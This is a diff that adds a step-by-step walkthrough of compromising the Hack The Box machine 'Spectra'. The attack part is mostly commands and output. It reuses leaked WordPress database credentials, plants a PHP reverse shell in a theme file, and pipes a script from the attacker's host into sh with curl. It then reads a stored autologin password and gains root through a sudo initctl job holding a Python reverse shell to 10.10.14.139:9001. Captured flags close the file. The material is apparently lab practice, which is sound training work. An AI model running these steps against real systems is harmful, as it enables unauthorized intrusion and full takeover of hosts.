@@ -1,0 +1,211 @@
+Machine-Name : Spectra
+IP-Address   : 10.129.205.254
+
+Command-Line: sudo nmap 10.129.205.254 -p- -A -T4 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+
+Browser: http://spectra.htb/testing
+Notes: Found a directory with files.
+
+Browser: http://spectra.htb/testing/wp-config.php.save
+Notes: Went into page source and found PHP.
+Result:
+    // ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define( 'DB_NAME', 'dev' );
+
+    /** MySQL database username */
+    define( 'DB_USER', 'devtest' );
+
+    /** MySQL database password */
+    define( 'DB_PASSWORD', 'devteam01' );
+
+    /** MySQL hostname */
+    define( 'DB_HOST', 'localhost' );
+
+    /** Database Charset to use in creating database tables. */
+    define( 'DB_CHARSET', 'utf8' );
+
+    /** The Database Collate type. Don't change this if in doubt. */
+    define( 'DB_COLLATE', '' );
+
+Notes: Attempting to login to database.
+
+Command-Line: mysql -h 10.129.205.254 -u devtest -p -D dev
+Result:
+    Enter password: devteam01
+    ERROR 1130 (HY000): Host '10.10.14.139' is not allowed to connect to this MySQL server
+    *** ACCESS DENIED ***
+Notes: Unable to login through MYSQL port.
+
+Command-Line: ssh devtest@10.129.205.254
+Password: devteam01
+Result:
+    *** ACCESS DENIED ***
+Command-Line: ssh administrator@10.129.205.254
+Password: devteam01
+Result:
+    *** ACCESS DENIED ***
+Notes: Unable to SSH into machine using above credentials.
+
+Browser: http://spectra.htb/wp-login/
+Result:
+    *** ACCESS GRANTED ***
+
+Notes: Went into "Themes". Selected theme to edit: "Twenty Nineteen". Clicked "Select". Pasted following code above regular php code in editor. File: "/main/wp-content/themes/twentynineteen/404.php".
+Command-Line: cat rev-shell.php | xclip -selection clipboard
+File-Contents:
+    ./rev-shell/rev-shell.php
+Notes: After pasting in the php file-contents, I clicked "Update File".
+
+Command-Line: nc -lvnp 9001
+Browser: http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
+Result:
+    *** REVERSE-SHELL ***
+    $ whoami -> nginx
+
+$ cat /etc/lsb-release
+Result:
+    GOOGLE_RELEASE=87.3.41
+    CHROMEOS_RELEASE_BRANCH_NUMBER=85
+    CHROMEOS_RELEASE_TRACK=stable-channel
+    CHROMEOS_RELEASE_KEYSET=devkeys
+    CHROMEOS_RELEASE_NAME=Chromium OS
+    CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
+    CHROMEOS_RELEASE_BOARD=chromeover64
+    CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
+    CHROMEOS_RELEASE_BUILD_NUMBER=13505
+    CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
+    CHROMEOS_RELEASE_CHROME_MILESTONE=87
+    CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
+    CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
+    CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
+    CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
+    CHROMEOS_RELEASE_VERSION=87.3.41
+    CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64
+
+Command-Line(~/HackingTools/PEASS-ng/linPEAS$): sudo python3 -m http.server --bind 10.10.14.139 80
+$ curl 10.10.14.139/linpeas.sh | sh
+Result:
+    -rw-r--r-- 1 nginx nginx 3337 Feb 25  2021 /mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
+    define( 'DB_NAME', 'dev' );
+    define( 'DB_USER', 'dev' );
+    define( 'DB_PASSWORD', 'development01' );
+    define( 'DB_HOST', 'localhost' );
+
+    lrwxrwxrwx 1 root root 40 Dec 22  2020 /etc/ipsec.secrets -> /run/l2tpipsec_vpn/current/ipsec.secrets
+    lrwxrwxrwx 1 root root 37 Dec 22  2020 /etc/ipsec.conf -> /run/l2tpipsec_vpn/current/ipsec.conf
+
+    passwd file: /etc/autologin/passwd
+    passwd file: /etc/pam.d/passwd
+    passwd file: /etc/passwd
+    passwd file: /usr/local/etc/passwd
+    passwd file: /usr/share/baselayout/passwd
+
+    /etc/pam.d/chromeos-auth:  /usr/bin/test -f /mnt/stateful_partition/etc/devmode.passwd
+    /etc/pam.d/chromeos-auth:  pwdfile /mnt/stateful_partition/etc/devmode.passwd
+
+    ╔══════════╣ Searching root files in home dirs (limit 30)
+    /home/
+    /home/user
+    /home/.shadow
+    /home/nginx/.bash_history
+    /home/katie/.bash_history
+    /home/root
+    /root/
+
+$ cat /etc/autologin/passwd
+Result:
+    SummerHereWeCome!!
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    *** STTY SHELL ***
+    nginx@spectra / $
+
+Command-Line: ssh katie@10.129.205.254
+Password: SummerHereWeCome!!
+Result:
+    *** USER ACCESS ***
+    katie@spectra ~ $
+
+katie@spectra ~ $ cat user.txt
+Result:
+    e89d27fe195e9114ffa72ba8913a6130
+    *** USER OWNED ***
+
+katie@spectra ~ $ sudo -l
+Result:
+    User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+
+katie@spectra ~ $ sudo /sbin/initctl
+Result:
+    initctl: missing command
+    Try `initctl --help' for more information.
+
+katie@spectra ~ $ Usage: initctl [OPTION]... COMMAND [OPTION]... [ARG]...
+Result:
+    Options:
+          --session               use D-Bus session bus to connect to init daemon (for testing)
+          --system                use D-Bus system bus to connect to init daemon
+          --dest=NAME             destination well-known name on D-Bus bus
+      -q, --quiet                 reduce output to errors only
+      -v, --verbose               increase output to include informational messages
+          --help                  display this help and exit
+          --version               output version information and exit
+
+    For a list of commands, try `initctl help'.
+
+    Report bugs to <upstart-devel@lists.ubuntu.com>
+
+katie@spectra ~ $ sudo /sbin/initctl help
+Result:
+    Job commands:
+      start                       Start job.
+      stop                        Stop job.
+      restart                     Restart job.
+      reload                      Send HUP signal to job.
+      status                      Query status of job.
+      list                        List known jobs.
+
+    Event commands:
+      emit                        Emit an event.
+
+    Other commands:
+      reload-configuration        Reload the configuration of the init daemon.
+      version                     Request the version of the init daemon.
+      log-priority                Change the minimum priority of log messages from the init daemon
+      show-config                 Show emits, start on and stop on details for job configurations.
+      help                        display list of commands
+
+    For more information on a command, try `initctl COMMAND --help'.
+
+Notes: Able to execute files within /etc/init using sudo privileges.
+
+katie@spectra ~ $ cd /etc/init
+
+katie@spectra /etc/init $ nano test.conf
+Notes: Inserted following code into script.
+Code:
+    exec python3 -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.139",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Command-Line: nc -lvnp 9001
+katie@spectra /etc/init $ sudo /sbin/initctl stop test
+katie@spectra /etc/init $ sudo /sbin/initctl start test
+Result:
+    *** REVERSE-SHELL ***
+    *** ROOT ACCESS ***
+
+# whoami
+Result:
+    root
+
+# cat /root/root.txt
+Result:
+    d44519713b889d5e1f9e536d0c6df2fc
+    *** ROOT OWNED ***
+
+        *** FINISHED ***
